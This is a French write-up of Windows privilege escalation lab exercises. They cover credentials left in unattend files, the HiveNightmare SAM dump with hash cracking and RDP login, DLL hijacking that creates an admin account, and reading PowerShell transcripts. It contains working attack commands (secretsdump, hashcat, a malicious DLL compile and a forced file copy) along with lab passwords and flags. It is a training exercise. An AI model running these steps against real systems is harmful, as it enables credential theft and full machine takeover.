# Escalade de Privilèges Windows

Série d'exercices d'escalade de privilèges Windows ciblant des misconfigurations et vulnérabilités courantes.

---

## Tâche 0 - Fichiers d'installation sans surveillance

**Cible :** LAB01 | **Compte :** Student / Student
**Fichiers :** `extract_password.py`, `0-flag.txt`

### Vulnérabilité
Les fichiers d'installation automatique Windows (`Unattend.xml`, `sysprep.inf`, `autounattend.xml`) peuvent contenir des identifiants administrateur encodés en base64, laissés sur le disque après le déploiement du système d'exploitation.

### Emplacements scannés
- `C:\Windows\Panther\Unattend.xml`
- `C:\Windows\system32\sysprep\`
- `C:\autounattend.xml`

### Étapes d'exploitation
1. Scanner les emplacements courants pour trouver un fichier unattended
2. Extraire le champ `<AdministratorPassword><Value>` par regex
3. Décoder la valeur base64 (Windows encode `motdepasse + "Password"` avant l'encodage)
4. Utiliser les identifiants récupérés pour accéder à la session Administrateur et lire le flag

### Utilisation
```powershell
python .\extract_password.py
```

### Résultat
- Fichier trouvé : `C:\Windows\Panther\Unattend.xml`
- Valeur encodée : `U3VwM2VyU2VjcmV0UGFzczRBRG0xbg==`
- Mot de passe décodé : `Sup3erSecretPass4ADm1n`

---

## Tâche 1 - Fichiers de sauvegarde SAM & SYSTEM

**Cible :** LAB02 | **Compte :** Sammy / Sammy
**Fichiers :** `extract_sam.ps1`, `1-flag.txt`

### Vulnérabilité
CVE-2021-36934 (HiveNightmare / SeriousSAM) — Les permissions sur `C:\Windows\System32\config\SAM` autorisent la lecture par les utilisateurs non-privilégiés (`BUILTIN\Users:(I)(RX)`). Les fichiers SAM/SYSTEM peuvent être extraits depuis les sauvegardes internes sans droits administrateur.

### Étapes d'exploitation
1. Vérifier la vulnérabilité :
```powershell
icacls C:\Windows\System32\config\SAM
# Vulnérable si : BUILTIN\Users:(I)(RX)
```
2. Télécharger et exécuter `HiveNightmare.exe` pour extraire les fichiers SAM/SYSTEM/SECURITY depuis les copies shadow
3. Transférer les fichiers extraits vers Kali Linux
4. Extraire les hashes NTLM avec `impacket-secretsdump` :
```bash
impacket-secretsdump -sam SAM-* -system SYSTEM-* -security SECURITY-* LOCAL
```
5. Cracker le hash NTLM avec hashcat :
```bash
hashcat -m 1000 13b29964cc2480b4ef454c59562e675c /usr/share/wordlists/rockyou.txt
```
6. Se connecter en RDP avec le mot de passe récupéré :
```bash
xfreerdp3 /u:Administrator /p:P@ssword /v:<IP_LAB02>
```
7. Lancer `flag.exe` sur le bureau de superAdministrator

### Résultat
- Hash NTLM Administrator : `13b29964cc2480b4ef454c59562e675c`
- Mot de passe cracké : `P@ssword`
- SuperAdministrator partage le même hash que Administrator

---

## Tâche 2 - Détournement de DLL via permissions faibles

**Cible :** LAB03 | **Compte :** Student / Student
**Fichiers :** `malicious.c`, `hijack_service.ps1`, `2-flag.txt`

### Vulnérabilité
Un service tournant avec les privilèges SYSTEM charge une DLL depuis un répertoire accessible en écriture par des utilisateurs non-privilégiés. Remplacer la DLL par une version malveillante permet l'exécution de code en contexte SYSTEM.

### Chemin vulnérable
```
C:\Program Files\Confluence\bin\SprintCSPDLL.dll
```

### Étapes d'exploitation
1. Exécuter `PrivescCheck.ps1 -Extended` pour identifier les services avec permissions faibles (niveau **High** : Services - Image File Permissions)
2. Compiler la DLL malveillante qui crée un utilisateur admin :
```bash
# Sur Linux avec mingw-w64
x86_64-w64-mingw32-gcc -shared -o SprintCSPDLL.dll malicious.c
```
3. Copier la DLL dans le chemin vulnérable :
```powershell
Copy-Item SprintCSPDLL.dll "C:\Program Files\Confluence\bin\SprintCSPDLL.dll" -Force
```
4. Déclencher le chargement de la DLL via `WIN10RpcClient.exe`
5. La DLL crée l'utilisateur `hacker:Password123!` avec droits administrateur
6. Accéder au bureau de superAdministrator et lancer `flag.exe`

### Utilisation
```powershell
powershell -ExecutionPolicy Bypass -File .\hijack_service.ps1
```

---

## Tâche 3 - Fichiers de transcription PowerShell

**Cible :** LAB04 | **Compte :** Student / Student
**Fichiers :** `transcript_hunt.ps1`, `find_flag.ps1`, `3-flag.txt`

### Vulnérabilité
La transcription PowerShell était activée via GPO et configurée pour sauvegarder toutes les sessions dans un répertoire lisible par les utilisateurs non-privilégiés. Les sessions administrateur précédentes, incluant des commandes sensibles et leurs sorties, étaient accessibles en clair.

### Clé de registre
```
HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription
OutputDirectory = C:\Users\Student\Documents\PowerShell
EnableTranscripting = 1
```

### Étapes d'exploitation
1. Vérifier la clé de registre pour trouver le répertoire de sortie des transcripts :
```powershell
Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription'
```
2. Lister les fichiers transcript par dossier de date :
```powershell
Get-ChildItem 'C:\Users\Student\Documents\PowerShell' -Recurse | Select FullName
```
3. Rechercher dans les transcripts les commandes sensibles :
```powershell
Get-Content 'C:\Users\Student\Documents\PowerShell\20260310\*.txt' | Select-String 'Generated flag'
```
4. Extraire le flag depuis la sortie enregistrée d'une session admin précédente

### Utilisation
```powershell
powershell -ExecutionPolicy Bypass -File .\transcript_hunt.ps1
```

### Découverte clé
Le fichier `hdkARk1N.20260310035230.txt` contenait une session admin où la commande de génération du flag avait été exécutée et enregistrée en clair :
```powershell
$passPhrase = 'L0K8H7I6G5F4E3D2'
$username   = 'jbn179'
$flag       = MD5($passPhrase + $username)
# Generated flag: 6ace322503cf34d37f9827ef4ec66c94
```
